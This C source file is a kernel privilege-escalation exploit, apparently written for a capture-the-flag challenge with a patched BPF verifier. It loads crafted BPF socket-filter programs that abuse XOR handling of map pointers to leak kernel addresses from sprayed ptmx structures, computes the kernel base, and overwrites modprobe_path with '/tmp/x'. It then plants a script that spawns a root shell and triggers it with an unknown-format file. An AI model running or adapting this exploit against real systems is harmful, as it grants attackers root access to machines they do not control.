#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>
#include <linux/bpf.h>
#include "bpf_insn.h"
#include <sys/socket.h>

#define DEV_PATH "/dev/bank"   // the path the device is placed

#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

bool is_kernel_ptr(uint64_t val)
{
    return (val & 0xffffffff00000000) == 0xffffffff00000000
        && val != 0xffffffffffffffff;
}

#define R0 BPF_REG_0
#define R1 BPF_REG_1
#define R2 BPF_REG_2
#define R3 BPF_REG_3
#define R4 BPF_REG_4
#define R5 BPF_REG_5
#define R6 BPF_REG_6
#define R7 BPF_REG_7
#define R8 BPF_REG_8
#define R9 BPF_REG_9
#define R10 BPF_REG_10

#define BPF_LOG_BUF_SIZE 65535
char bpf_log_buf[BPF_LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		const struct bpf_insn *insns, int prog_len,
		const char *license, int kern_version){

	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (uint64_t)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (uint64_t)license,
		.log_buf = (uint64_t)bpf_log_buf,
		.log_size = BPF_LOG_BUF_SIZE,
		.log_level = 2,
	};
	attr.kern_version = kern_version;
	bpf_log_buf[0] = 0;
	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		int max_entries){

	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};
	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
	union bpf_attr attr = {
		.map_fd = fd,
		.key = (uint64_t)key,
		.value = (uint64_t)value,
		.flags = flags,
	};
	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

}

static int bpf_lookup_elem(int fd, void *key, void *value){
	union bpf_attr attr = {
		.map_fd = fd,
		.key = (uint64_t)key,
		.value = (uint64_t)value,
	};
	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static uint64_t leak(int i) {
    int map_fd;
    int prog_fd;
    int ret;
    int scks[0x2];
    int fds[0x200];
    int key;
    uint64_t value;

    map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), sizeof(value),
            0x80);

    for (int i = 0; i < 0x200; i++) {
        int fd = open("/dev/ptmx", O_RDONLY);

        if (fd < 0) {
            errExit("open ptmx");
        }

        fds[i] = fd;
    }

    if (map_fd < 0) {
        errExit("create map");
    }

    ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, scks);

    if (ret < 0) {
        errExit("socketpair");
    }

    
    uint64_t off = 0x296f0 + i * 0x1000;


    /*
     * what the patch does:
     * 1. If xor on PTR_TO_MAP_VALUE change type to scalar and perform xor
     * 2. Next time xor performed on this value, it is set back to
     *    PTR_TO_MAP_VALUE
     *
     * - we can't simply add an imm to the adjusted scalar value and change
     * it back to PTR_TO_MAP_VALUE
     * - therefore we need to do calculate the wanted value based on xors 
     */
	struct bpf_insn prog[] = {
        /* set r0 to 0 to indicate no error ? (needed) */
        BPF_LD_IMM64(R0, 0x0),
		BPF_STX_MEM(BPF_W, R10, R0, -4),
		BPF_MOV64_REG(R2, R10),
		BPF_ALU64_IMM(BPF_ADD, R2, -4),
		BPF_LD_MAP_FD(R1, map_fd),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, R0, 0, 11),
        /* store map ptr to r0 in r1 */
        BPF_MOV64_REG(R1, R0),
        BPF_MOV64_REG(R2, R0),
        BPF_MOV64_REG(R3, R0),
        BPF_MOV64_REG(R4, R0),
        /* r1 now seen as scalar */
        BPF_ALU64_IMM(BPF_XOR, R1, 0x0),
        /* now points to tty->ops */
        BPF_ALU64_IMM(BPF_ADD, R1, off + 0x18),
        // r2 = goal ^ map_ptr
        BPF_ALU64_REG(BPF_XOR, R2, R1),
        // r3 = goal ^ map_ptr ^ map_ptr = goal
        BPF_ALU64_REG(BPF_XOR, R3, R2),
        // r3 = [goal]
        BPF_ALU64_IMM(BPF_XOR, R3, 0x0),
        // map[0] = [goal]
        BPF_LDX_MEM(BPF_DW, R1, R3, 0x0),
        /* store address of r0 pointer in map*/
        BPF_STX_MEM(BPF_DW, R0, R1, 0x0),

		BPF_MOV64_IMM(R0, 0),
		BPF_EXIT_INSN(),
	};

	prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog),
				   "GPL", 0);

    puts(bpf_log_buf);
    if (prog_fd < 0) {
        errExit("bpf_prog_load");
    }

    ret = setsockopt(scks[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd,
                    sizeof(prog_fd));

    if (ret < 0) {
        errExit("setsockopt");
    }

    char buf[0x40];
    write(scks[0], buf, sizeof(buf));

    uint64_t leak;
    key = 0x0;

    ret = bpf_lookup_elem(map_fd, &key, &leak);

    if (ret < 0) {
        errExit("map lookup");
        return -1;
    }

    printf("leak: %p \n", leak);

    if (is_kernel_ptr(leak)) {
        leak -= 0x13fc820;
    }

    for (int i = 0; i < 0x200; i++) {
        close(fds[i]);
    }

    for (int i = 0; i < 0x2; i++) {
        close(scks[i]);
    }

    return leak;
}

static void overwrite_modprobe(uint64_t addr, uint64_t path) {
    int map_fd;
    int prog_fd;
    int ret;
    int scks[0x2];
    int key;
    uint64_t value;

    map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), sizeof(value),
            0x80);

    if (map_fd < 0) {
        errExit("create map");
    }

    ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, scks);

    if (ret < 0) {
        errExit("socketpair");
    } 

	struct bpf_insn prog[] = {
        /* set r0 to 0 to indicate no error ? (needed) */
        BPF_MOV64_IMM(R0, 0x0),
		BPF_STX_MEM(BPF_W, R10, R0, -4),
		BPF_MOV64_REG(R2, R10),
		BPF_ALU64_IMM(BPF_ADD, R2, -4),
		BPF_LD_MAP_FD(R1, map_fd),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, R0, 0, 31),
        /* store addr in R1 */
        BPF_MOV64_IMM(R1, 0),
        BPF_MOV64_IMM(R2, (addr >> 0x30) & 0xffff),
        BPF_ALU64_IMM(BPF_LSH, R2, 0x30),
        BPF_ALU64_REG(BPF_OR, R1, R2),
        BPF_MOV64_IMM(R2, (addr >> 0x20) & 0xffff),
        BPF_ALU64_IMM(BPF_LSH, R2, 0x20),
        BPF_ALU64_REG(BPF_OR, R1, R2),
        BPF_MOV64_IMM(R2, (addr >> 0x10) & 0xffff),
        BPF_ALU64_IMM(BPF_LSH, R2, 0x10),
        BPF_ALU64_REG(BPF_OR, R1, R2),
        BPF_MOV64_IMM(R2, addr & 0xffff),
        BPF_ALU64_REG(BPF_OR, R1, R2),
        /* store path in R2 */
        BPF_MOV64_IMM(R2, 0),
        BPF_MOV64_IMM(R3, (path >> 0x30) & 0xffff),
        BPF_ALU64_IMM(BPF_LSH, R3, 0x30),
        BPF_ALU64_REG(BPF_OR, R2, R3),
        BPF_MOV64_IMM(R3, (path >> 0x20) & 0xffff),
        BPF_ALU64_IMM(BPF_LSH, R3, 0x20),
        BPF_ALU64_REG(BPF_OR, R2, R3),
        BPF_MOV64_IMM(R3, (path >> 0x10) & 0xffff),
        BPF_ALU64_IMM(BPF_LSH, R3, 0x10),
        BPF_ALU64_REG(BPF_OR, R2, R3),
        BPF_MOV64_IMM(R3, path & 0xffff),
        BPF_ALU64_REG(BPF_OR, R2, R3),
        /* get map ptr to addr */
        BPF_MOV64_REG(R3, R0),
        /* r3 = goal ^ map_ptr */
        BPF_ALU64_IMM(BPF_XOR, R3, 0x0),
        BPF_ALU64_REG(BPF_XOR, R3, R1),
        BPF_ALU64_IMM(BPF_XOR, R3, 0x0),
        /* r0 = goal ^ map_ptr ^ map_ptr = goal */
        BPF_ALU64_IMM(BPF_XOR, R0, 0x0),
        BPF_ALU64_REG(BPF_XOR, R0, R3),
        /* addr = path */
        BPF_STX_MEM(BPF_DW, R0, R2, 0x0),
        BPF_LD_IMM64(R0, 0x0),
		BPF_EXIT_INSN(),
	};

	prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog),
				   "GPL", 0);

    printf("%p \n", prog_fd);
    puts(bpf_log_buf);
    if (prog_fd < 0) {
        errExit("bpf_prog_load");
    }

    ret = setsockopt(scks[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd,
                    sizeof(prog_fd));

    if (ret < 0) {
        errExit("setsockopt");
    }

    char buf[0x40];
    write(scks[0], buf, sizeof(buf));

    uint64_t leak;
    key = 0x0;

    ret = bpf_lookup_elem(map_fd, &key, &leak);

    if (ret < 0) {
        errExit("map lookup");
    }

    printf("leak: %p \n", leak);
}

// https://www.kernel.org/doc/html/latest/bpf/instruction-set.html#load-and-store-instructions
// https://man7.org/linux/man-pages/man2/bpf.2.html
// https://www.kernel.org/doc/html/latest/bpf/verifier.html
int main(void) 
{
    uint64_t k_base;

    for (int i = 0; i < 0x100; i++) {
        k_base = leak(i);

        if (is_kernel_ptr(k_base)) {
            break;
        }
    }

    printf("Kbase: %p \n", k_base);

    uint64_t modprobe = k_base + 0x184db40;

    printf("Modprobe: %p \n", modprobe);

    // /tmp/x
    overwrite_modprobe(modprobe, 0x782f706d742f);

    shell_modprobe();

    return 0;
}
